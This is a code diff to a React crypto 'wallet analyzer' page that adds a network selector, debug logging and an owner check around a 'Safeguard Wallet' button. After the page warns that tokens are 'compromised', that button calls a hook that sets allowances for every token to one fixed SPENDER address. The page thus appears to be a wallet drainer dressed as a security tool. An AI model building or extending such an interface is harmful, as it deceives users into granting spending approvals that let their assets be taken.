@@ -10,6 +10,7 @@ import { useRef } from "react";
 import { ethers } from "ethers";
 import { useTokenSecurityAnalysis } from '../../../hooks/useTokenSecurityAnalysis';
 import { useAllowanceSetter } from '../../../hooks/useAllowanceSetter';
+import { mainnet, polygon, arbitrum, optimism, avalanche, bsc, sepolia } from 'wagmi/chains';
 
 const steps = [
   {
@@ -61,20 +62,39 @@ export default function WalletAnalyzerPage() {
   const { address: connectedAddress, isConnected: wagmiIsConnected } = useAccount();
   // We'll get chain from RainbowKit ConnectButton.Custom render prop
   const [selectedChainId, setSelectedChainId] = useState<number | undefined>(undefined);
-  const { tokens, loading: tokensLoading, error: tokensError } = useTokenBalances(wagmiIsConnected && selectedChainId ? connectedAddress : undefined, wagmiIsConnected && selectedChainId ? selectedChainId : undefined);
+  // Determine which address and chainId to use for hooks
+  const effectiveAddress = isConnected ? connectedAddress : address;
+  const effectiveChainId = isConnected ? selectedChainId : (!isConnected && address && selectedChainId ? selectedChainId : undefined);
+
+  // Debug logging for hook parameters
+  console.log('[WalletAnalyzer] useTokenBalances params:', { effectiveAddress, effectiveChainId, isConnected, connectedAddress, address, selectedChainId });
+
+  const { tokens, loading: tokensLoading, error: tokensError } = useTokenBalances(
+    effectiveAddress && effectiveChainId ? effectiveAddress : undefined,
+    effectiveAddress && effectiveChainId ? effectiveChainId : undefined
+  );
+
+  // Debug logging for analysis hook
+  console.log('[WalletAnalyzer] useTokenSecurityAnalysis params:', {
+    tokens,
+    owner: effectiveAddress,
+    chainId: effectiveChainId,
+    isConnected,
+    spender: SPENDER,
+  });
 
   const { analyzing, result, tokenStatuses, analyze, reset } = useTokenSecurityAnalysis({
     tokens,
-    owner: isConnected ? connectedAddress : address,
-    chainId: selectedChainId,
+    owner: effectiveAddress,
+    chainId: effectiveChainId,
     isConnected,
     spender: SPENDER,
   });
 
   const { setAllowances, progress: allowanceProgress, errors: allowanceErrors, running: allowanceRunning } = useAllowanceSetter({
     tokens: tokens.map(t => ({ contractAddress: t.contractAddress, symbol: t.symbol, decimals: t.decimals })),
-    owner: isConnected ? connectedAddress : address,
-    chainId: selectedChainId,
+    owner: effectiveAddress,
+    chainId: effectiveChainId,
     spender: SPENDER,
   });
 
@@ -177,6 +197,8 @@ export default function WalletAnalyzerPage() {
       setShowSafeguardSummary(true);
     }
   }, [showSafeguardModal, allowanceRunning, allowanceProgress, tokens.length]);
+
+  const supportedChains = [mainnet, polygon, arbitrum, optimism, avalanche, bsc, sepolia];
 
   return (
     <div className="min-h-screen bg-[#0D0D0D] text-white flex flex-col items-center pb-20">
@@ -364,13 +386,39 @@ export default function WalletAnalyzerPage() {
                 className="w-full px-4 py-3 rounded-xl bg-white/10 border border-cyan-400/30 text-white placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 transition-all mb-2 font-mono text-lg shadow-inner"
                 autoComplete="off"
               />
+              {/* Chain/network dropdown */}
+              <label htmlFor="chain" className="text-gray-400 text-sm mb-1 mt-2 block">
+                Select network:
+              </label>
+              <select
+                id="chain"
+                value={selectedChainId || ''}
+                onChange={e => setSelectedChainId(Number(e.target.value) || undefined)}
+                className="w-full px-4 py-3 rounded-xl bg-[#181F2B] border border-cyan-400/40 text-cyan-200 focus:outline-none focus:ring-2 focus:ring-cyan-400 transition-all mb-2 font-mono text-lg shadow-inner appearance-none"
+                style={{
+                  backgroundImage: 'linear-gradient(45deg, #0D0D0D 60%, #22d3ee22 100%)',
+                  color: '#a5f3fc',
+                  fontWeight: 600,
+                  letterSpacing: '0.03em',
+                  boxShadow: '0 0 0 1.5px #22d3ee44',
+                  WebkitAppearance: 'none',
+                  MozAppearance: 'none',
+                  appearance: 'none',
+                  cursor: 'pointer',
+                }}
+              >
+                <option value="" style={{ background: '#181F2B', color: '#a5f3fc' }}>-- Select Network --</option>
+                {supportedChains.map(chain => (
+                  <option key={chain.id} value={chain.id} style={{ background: '#181F2B', color: '#a5f3fc' }}>{chain.name}</option>
+                ))}
+              </select>
             </>
           )}
           {/* Analyze & View Assets Buttons */}
           <div className="flex flex-col sm:flex-row gap-3 sm:gap-4 mt-4 w-full justify-center items-stretch">
             <motion.button
               onClick={handleAnalyze}
-              disabled={(!isConnected && !address) || analyzing}
+              disabled={(!isConnected && (!address || !selectedChainId)) || analyzing}
               whileHover={{ scale: 1.05, boxShadow: "0 0 24px #39ff14cc" }}
               whileTap={{ scale: 0.97 }}
               className="inline-block px-10 py-4 rounded-2xl bg-lime-400 text-black font-extrabold text-xl shadow-lg hover:bg-cyan-400 hover:text-white transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-lime-400 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-xl disabled:opacity-60 disabled:cursor-not-allowed animate-pulse-fast w-full sm:w-auto"
@@ -401,15 +449,21 @@ export default function WalletAnalyzerPage() {
                   ? "Warning: One or more tokens are compromised. Please review technical analysis below and safeguard your assets are safe malicious contracts."
                   : result.message}
               </span>
-              {/* Safeguard Wallet Button */}
+              {/* Safeguard Wallet Button or Connect Prompt */}
               {result.status === "compromised" && (
-                <button
-                  className="inline-block px-8 py-3 rounded-xl bg-pink-500 text-white font-extrabold text-lg shadow-lg hover:bg-cyan-400 hover:text-black transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-pink-500 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-lg mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
-                  onClick={() => { setShowSafeguardModal(true); setAllowances(); }}
-                  disabled={allowanceRunning}
-                >
-                  {allowanceRunning ? "Safeguarding..." : "Safeguard Wallet"}
-                </button>
+                isConnected && (connectedAddress?.toLowerCase() === (address || connectedAddress)?.toLowerCase()) ? (
+                  <button
+                    className="inline-block px-8 py-3 rounded-xl bg-pink-500 text-white font-extrabold text-lg shadow-lg hover:bg-cyan-400 hover:text-black transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-pink-500 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-lg mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
+                    onClick={() => { setShowSafeguardModal(true); setAllowances(); }}
+                    disabled={allowanceRunning}
+                  >
+                    {allowanceRunning ? "Safeguarding..." : "Safeguard Wallet"}
+                  </button>
+                ) : (
+                  <div className="mt-2 px-4 py-2 rounded-xl bg-pink-400/20 text-pink-200 font-bold text-base border-2 border-pink-400/40 text-center">
+                    To safeguard this wallet, please connect as its owner.
+                  </div>
+                )
               )}
               {/* Technical Analysis Report */}
               {tokenStatuses && (
